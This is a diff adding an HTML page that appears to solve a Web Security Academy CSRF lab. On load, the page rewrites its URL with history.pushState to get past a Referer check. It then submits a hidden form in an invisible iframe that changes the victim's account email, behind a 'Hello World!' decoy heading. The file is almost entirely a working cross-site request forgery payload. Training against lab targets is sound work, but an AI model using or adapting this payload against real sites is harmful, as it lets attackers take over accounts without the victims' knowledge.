@@ -1,0 +1,12 @@
+<html>
+    <body>
+        <script>history.pushState('','','/?0a870012046425f6c0ad7f38009c00d8.web-security-academy.net/my-account')</script>
+        <h1>Hello World!</h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0a870012046425f6c0ad7f38009c00d8.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
+            <input type="hidden" name="email" value="asd@test.net">
+        </form>
+
+        <script>document.getElementById("csrf-form").submit()</script>
+    </body>
+</html>
